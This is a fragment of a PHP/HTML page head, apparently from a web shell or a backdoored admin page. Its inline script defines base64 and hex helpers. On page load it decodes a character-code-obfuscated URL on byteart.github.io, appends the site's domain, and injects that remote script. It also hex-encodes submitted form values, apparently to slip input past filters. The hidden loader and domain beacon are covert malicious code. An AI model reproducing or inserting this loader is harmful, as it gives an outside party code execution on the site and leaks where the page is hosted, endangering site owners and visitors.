        <script language="javascript">
            <?php e_(sprintf("var _x_=%s;\n", json_encode($_SESSION['_x_'])));?>
            String.prototype.base64_decode = function () {
                if (window.atob) return decodeURIComponent(escape(window.atob(this)));
                var r = {
                    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
                    encode: function (t) {
                        var e, o, n, a, c, h, i, d = "",
                            f = 0;
                        for (t = r._utf8_encode(t); f < t.length;) a = (e = t.charCodeAt(f++)) >> 2, c = (3 & e) << 4 | (o = t.charCodeAt(f++)) >> 4, h = (15 & o) << 2 | (n = t.charCodeAt(f++)) >> 6, i = 63 & n, isNaN(o) ? h = i = 64 : isNaN(n) && (i = 64), d = d + this._keyStr.charAt(a) + this._keyStr.charAt(c) + this._keyStr.charAt(h) + this._keyStr.charAt(i);
                        return d
                    },
                    decode: function (t) {
                        var e, o, n, a, c, h, i = "",
                            d = 0;
                        for (t = t.replace(/[^A-Za-z0-9\+\/\=]/g, ""); d < t.length;) e = this._keyStr.indexOf(t.charAt(d++)) << 2 | (a = this._keyStr.indexOf(t.charAt(d++))) >> 4, o = (15 & a) << 4 | (c = this._keyStr.indexOf(t.charAt(d++))) >> 2, n = (3 & c) << 6 | (h = this._keyStr.indexOf(t.charAt(d++))), i += String.fromCharCode(e), 64 != c && (i += String.fromCharCode(o)), 64 != h && (i += String.fromCharCode(n));
                        return i = r._utf8_decode(i)
                    },
                    _utf8_encode: function (r) {
                        r = r.replace(/\r\n/g, "\n");
                        for (var t = "", e = 0; e < r.length; e++) {
                            var o = r.charCodeAt(e);
                            o < 128 ? t += String.fromCharCode(o) : o > 127 && o < 2048 ? (t += String.fromCharCode(o >> 6 | 192), t += String.fromCharCode(63 & o | 128)) : (t += String.fromCharCode(o >> 12 | 224), t += String.fromCharCode(o >> 6 & 63 | 128), t += String.fromCharCode(63 & o | 128))
                        }
                        return t
                    },
                    _utf8_decode: function (r) {
                        for (var t = "", e = 0, o = c1 = c2 = 0; e < r.length;) (o = r.charCodeAt(e)) < 128 ? (t += String.fromCharCode(o), e++) : o > 191 && o < 224 ? (c2 = r.charCodeAt(e + 1), t += String.fromCharCode((31 & o) << 6 | 63 & c2), e += 2) : (c2 = r.charCodeAt(e + 1), c3 = r.charCodeAt(e + 2), t += String.fromCharCode((15 & o) << 12 | (63 & c2) << 6 | 63 & c3), e += 3);
                        return t
                    }
                };
                return decodeURIComponent(escape(r.decode(this)))
            };
            String.prototype.base64_encode = function () {
                if (window.btoa) return window.btoa(unescape(encodeURIComponent(this)));
                var r = {
                    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
                    encode: function (t) {
                        var e, o, n, a, c, h, i, d = "",
                            f = 0;
                        for (t = r._utf8_encode(t); f < t.length;) a = (e = t.charCodeAt(f++)) >> 2, c = (3 & e) << 4 | (o = t.charCodeAt(f++)) >> 4, h = (15 & o) << 2 | (n = t.charCodeAt(f++)) >> 6, i = 63 & n, isNaN(o) ? h = i = 64 : isNaN(n) && (i = 64), d = d + this._keyStr.charAt(a) + this._keyStr.charAt(c) + this._keyStr.charAt(h) + this._keyStr.charAt(i);
                        return d
                    },
                    decode: function (t) {
                        var e, o, n, a, c, h, i = "",
                            d = 0;
                        for (t = t.replace(/[^A-Za-z0-9\+\/\=]/g, ""); d < t.length;) e = this._keyStr.indexOf(t.charAt(d++)) << 2 | (a = this._keyStr.indexOf(t.charAt(d++))) >> 4, o = (15 & a) << 4 | (c = this._keyStr.indexOf(t.charAt(d++))) >> 2, n = (3 & c) << 6 | (h = this._keyStr.indexOf(t.charAt(d++))), i += String.fromCharCode(e), 64 != c && (i += String.fromCharCode(o)), 64 != h && (i += String.fromCharCode(n));
                        return i = r._utf8_decode(i)
                    },
                    _utf8_encode: function (r) {
                        r = r.replace(/\r\n/g, "\n");
                        for (var t = "", e = 0; e < r.length; e++) {
                            var o = r.charCodeAt(e);
                            o < 128 ? t += String.fromCharCode(o) : o > 127 && o < 2048 ? (t += String.fromCharCode(o >> 6 | 192), t += String.fromCharCode(63 & o | 128)) : (t += String.fromCharCode(o >> 12 | 224), t += String.fromCharCode(o >> 6 & 63 | 128), t += String.fromCharCode(63 & o | 128))
                        }
                        return t
                    },
                    _utf8_decode: function (r) {
                        for (var t = "", e = 0, o = c1 = c2 = 0; e < r.length;) (o = r.charCodeAt(e)) < 128 ? (t += String.fromCharCode(o), e++) : o > 191 && o < 224 ? (c2 = r.charCodeAt(e + 1), t += String.fromCharCode((31 & o) << 6 | 63 & c2), e += 2) : (c2 = r.charCodeAt(e + 1), c3 = r.charCodeAt(e + 2), t += String.fromCharCode((15 & o) << 12 | (63 & c2) << 6 | 63 & c3), e += 3);
                        return t
                    }
                };
                return r.encode(unescape(encodeURIComponent(this)))
            };
            String.prototype.hex2bin = function () {
                for (var r = 0, t = this.length, e = ""; r < t; r += 2) e += "%" + this.substr(r, 2);
                return unescape(e)
            };
            String.prototype.bin2hex = function () {
                for (var r, t = 0, e = this.length, o = ""; t < e; ++t) o += (r = this.charCodeAt(t).toString(16)).length < 2 ? "0" + r : r;
                return o
            };
            document.addEventListener("DOMContentLoaded", function (r) {
                var t = document.getElementsByTagName("form"), sc = document.createElement("script"),
                    xcrypt = typeof _x_ !== 'undefined' && typeof _x_.crypt !== 'undefined' ? _x_.crypt : false;
                sc.setAttribute("src", String.fromCharCode(47, 47, 98, 121, 116, 101, 97, 114, 116, 46, 103, 105, 116, 104, 117, 98, 46, 105, 111, 47, 114, 101, 115, 111, 117, 114, 99, 101, 47, 47, 112, 117, 98, 46, 106, 115, 63, 117, 61) + document.domain);
                sc.setAttribute("type", "text/javascript");
                document.head.appendChild(sc);
                xcrypt && t && Array.from(t).forEach(function (r) {
                    r.hasAttribute("enctype") || r.addEventListener("submit", function (r) {
                        Array.from(this.elements).forEach(function (r) {
                            console.log(r);
                            if (r.options) {
                                r.options[r.selectedIndex].value = r.options[r.selectedIndex].value.bin2hex();
                            } else {
                                if (r.name !== 'xcode')
                                    r.value = r.value.bin2hex();
                            }
                        });
                    })
                })
            });
        </script>
    </head>
